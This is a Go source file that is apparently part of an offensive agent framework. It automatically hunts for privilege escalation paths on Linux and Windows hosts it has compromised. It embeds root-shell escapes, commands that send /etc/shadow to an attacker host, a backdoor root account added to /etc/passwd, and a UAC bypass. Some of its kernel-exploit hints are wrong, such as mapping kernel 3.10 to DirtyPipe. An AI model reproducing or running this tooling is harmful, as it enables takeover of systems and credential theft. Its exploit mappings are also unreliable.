// agents/cell/post/privesc.go
// Privilege escalation — Linux (sudo, SUID, capabilities, kernel) + Windows (UAC, token).

package post

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

type PrivescResult struct {
	Success    bool
	Method     string
	Technique  string
	Error      string
	Output     string
	Suggestion string
}

// Escalate attempts privilege escalation using all available methods.
func Escalate() PrivescResult {
	if runtime.GOOS == "windows" {
		return escalateWindows()
	}
	return escalateLinux()
}

func escalateLinux() PrivescResult {
	checks := []func() PrivescResult{
		checkSudo, checkSUID, checkCapabilities, checkCron,
		checkWritablePasswd, checkKernel,
	}
	for _, check := range checks {
		r := check()
		if r.Suggestion != "" || r.Success {
			return r
		}
	}
	return PrivescResult{Error: "no escalation path found"}
}

func checkSudo() PrivescResult {
	out, err := exec.Command("sudo", "-nl").CombinedOutput()
	if err != nil {
		return PrivescResult{Error: "sudo -nl failed"}
	}
	output := string(out)
	// GTFOBins lookup hints
	hints := map[string]string{
		"vim":    "sudo vim -c ':!/bin/sh'",
		"nano":   "sudo nano -> Ctrl+R Ctrl+X -> /bin/sh",
		"less":   "sudo less /etc/passwd -> !/bin/sh",
		"find":   "sudo find . -exec /bin/sh \\; -quit",
		"awk":    "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
		"perl":   "sudo perl -e 'exec \"/bin/sh\";'",
		"python": "sudo python -c 'import os; os.system(\"/bin/sh\")'",
		"tar":    "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
		"zip":    "sudo zip /tmp/test.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'",
		"man":    "sudo man man -> !/bin/sh",
		"wget":   "sudo wget --post-file=/etc/shadow <attacker>",
		"curl":   "sudo curl <attacker> --data @/etc/shadow",
	}
	for bin, hint := range hints {
		if strings.Contains(output, bin) || strings.Contains(output, fmt.Sprintf("(%s)", bin)) {
			return PrivescResult{
				Method: "sudo", Technique: bin,
				Suggestion: fmt.Sprintf("GTFOBins: %s", hint),
			}
		}
	}
	if strings.Contains(output, "(ALL) NOPASSWD:") {
		return PrivescResult{Method: "sudo", Technique: "ALL_NOPASSWD",
			Suggestion: "sudo /bin/sh (root shell sin password)"}
	}
	if strings.Contains(output, "(root) NOPASSWD:") {
		return PrivescResult{Method: "sudo", Technique: "root_NOPASSWD",
			Suggestion: "sudo <comando_permitido>"}
	}
	return PrivescResult{Error: "no sudo misconfig found"}
}

func checkSUID() PrivescResult {
	out, err := exec.Command("sh", "-c", "find / -perm -4000 -type f -ls 2>/dev/null").CombinedOutput()
	if err != nil && len(out) == 0 {
		return PrivescResult{Error: "find failed"}
	}
	output := string(out)

	suidExploits := map[string]string{
		"pkexec":  "CVE-2021-4034 PwnKit: /usr/bin/pkexec (todas versiones parcheables)",
		"sudo":    "CVE-2021-3156 Baron Samedit: sudoedit bypass",
		"screen":  "CVE-2017-5618: screen 4.5.0 SUID privilege escalation",
		"at":      "GTFOBins: echo /bin/sh | at now",
		"bash":    "GTFOBins: bash -p (privileged shell)",
		"dash":    "GTFOBins: dash -p",
		"python":  "GTFOBins: python -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'",
		"ruby":    "GTFOBins: ruby -e 'exec \"/bin/sh -p\"'",
		"node":    "GTFOBins: node -e 'require(\"child_process\").spawn(\"/bin/sh\",[\"-p\"],{stdio:\"inherit\"})'",
	}
	for bin, hint := range suidExploits {
		if strings.Contains(output, "/"+bin) {
			return PrivescResult{Method: "suid", Technique: bin, Suggestion: hint}
		}
	}
	if len(output) > 0 {
		return PrivescResult{Method: "suid", Technique: "detected",
			Suggestion: fmt.Sprintf("SUID binaries found, check GTFOBins:\n%s", output[:500])}
	}
	return PrivescResult{Error: "no SUID binaries found"}
}

func checkCapabilities() PrivescResult {
	out, err := exec.Command("sh", "-c", "getcap -r / 2>/dev/null").CombinedOutput()
	if err == nil && len(out) > 0 {
		output := string(out)
		if strings.Contains(output, "cap_setuid") || strings.Contains(output, "cap_sys_admin") {
			return PrivescResult{Method: "capabilities", Technique: "setuid_admin",
				Suggestion: fmt.Sprintf("Binary with dangerous capabilities:\n%s", output[:500])}
		}
		if len(output) > 0 {
			return PrivescResult{Method: "capabilities", Technique: "detected",
				Suggestion: fmt.Sprintf("Capabilities found:\n%s", output[:300])}
		}
	}
	return PrivescResult{Error: "no capabilities found"}
}

func checkCron() PrivescResult {
	paths := []string{"/etc/crontab", "/etc/cron.d/", "/var/spool/cron/crontabs/", "/var/spool/cron/"}
	for _, path := range paths {
		files, _ := os.ReadDir(path)
		for _, f := range files {
			full := path + f.Name()
			if f.IsDir() {
				continue
			}
			data, err := os.ReadFile(full)
			if err != nil {
				continue
			}
			content := string(data)
			for _, line := range strings.Split(content, "\n") {
				line = strings.TrimSpace(line)
				if strings.HasPrefix(line, "#") || line == "" {
					continue
				}
				if (strings.Contains(line, "*") && !strings.Contains(line, "PATH=")) || strings.HasPrefix(line, "@") {
					return PrivescResult{Method: "cron", Technique: "writable_script",
						Suggestion: fmt.Sprintf("Cron job found in %s:\n%s", full, line)}
				}
			}
		}
	}
	return PrivescResult{Error: "no exploitable cron jobs"}
}

func checkWritablePasswd() PrivescResult {
	info, err := os.Stat("/etc/passwd")
	if err == nil && info.Mode().Perm()&0200 != 0 {
		return PrivescResult{Method: "writable_passwd", Technique: "/etc/passwd",
			Suggestion: "echo 'root2::0:0:root:/root:/bin/bash' >> /etc/passwd && su root2"}
	}
	info, err = os.Stat("/etc/shadow")
	if err == nil && info.Mode().Perm()&0400 == 0 {
		return PrivescResult{Method: "readable_shadow", Technique: "/etc/shadow",
			Suggestion: "cat /etc/shadow -> crack hashes with john/hashcat"}
	}
	return PrivescResult{Error: "passwd/shadow not writable"}
}

func checkKernel() PrivescResult {
	out, err := exec.Command("uname", "-r").CombinedOutput()
	if err != nil {
		return PrivescResult{Error: "uname failed"}
	}
	kernel := strings.TrimSpace(string(out))

	// Common kernel exploit hints
	kernelHints := map[string]string{
		"2.6.":  "DirtyCow CVE-2016-5195 — kernel 2.6.22 < 4.8.3",
		"3.10.": "DirtyPipe CVE-2022-0847 — kernel 5.8 < 5.16.11",
		"4.4.":  "DirtyCow / overlayfs CVE-2015-8660",
		"4.15.": "Spectre/Meltdown era — multiples CVEs",
		"5.8.":  "DirtyPipe CVE-2022-0847 — kernel 5.8 < 5.16.11",
		"5.10.": "DirtyPipe CVE-2022-0847 — kernel 5.8 < 5.16.11",
	}
	for prefix, hint := range kernelHints {
		if strings.HasPrefix(kernel, prefix) {
			return PrivescResult{Method: "kernel", Technique: kernel, Suggestion: hint}
		}
	}
	return PrivescResult{Method: "kernel", Technique: kernel, Suggestion: "No known exploit for this kernel version"}
}

func escalateWindows() PrivescResult {
	// Check AlwaysInstallElevated
	out, err := exec.Command("reg", "query",
		`HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`,
		"/v", "AlwaysInstallElevated").CombinedOutput()
	if err == nil && strings.Contains(string(out), "0x1") {
		return PrivescResult{Method: "always_install_elevated", Technique: "msiexec",
			Suggestion: "msiexec /quiet /i payload.msi (MSI se ejecuta como SYSTEM)"}
	}

	// Check UAC bypass via fodhelper
	if _, err := exec.LookPath("fodhelper.exe"); err == nil {
		return PrivescResult{Method: "uac_bypass", Technique: "fodhelper",
			Suggestion: "Registry hijack: HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command -> payload.exe"}
	}

	// Check unquoted service paths
	out, err = exec.Command("wmic", "service", "get", "name,pathname").CombinedOutput()
	if err == nil {
		for _, line := range strings.Split(string(out), "\n") {
			if strings.Contains(line, "Program Files") && !strings.Contains(line, "\"") &&
				!strings.HasPrefix(line, "Name") && len(line) > 10 {
				return PrivescResult{Method: "unquoted_service_path", Technique: "wmic",
					Suggestion: fmt.Sprintf("Unquoted path found: %s", strings.TrimSpace(line))}
			}
		}
	}

	// Token check
	out, err = exec.Command("whoami", "/priv").CombinedOutput()
	if err == nil && strings.Contains(string(out), "SeImpersonatePrivilege") {
		return PrivescResult{Method: "token_impersonation", Technique: "SeImpersonatePrivilege",
			Suggestion: "Potato attack: RoguePotato / SweetPotato / PrintSpoofer"}
	}
	if err == nil && strings.Contains(string(out), "SeAssignPrimaryTokenPrivilege") {
		return PrivescResult{Method: "token_impersonation", Technique: "SeAssignPrimaryTokenPrivilege",
			Suggestion: "Potato attack possible"}
	}

	return PrivescResult{Error: "no escalation path found"}
}
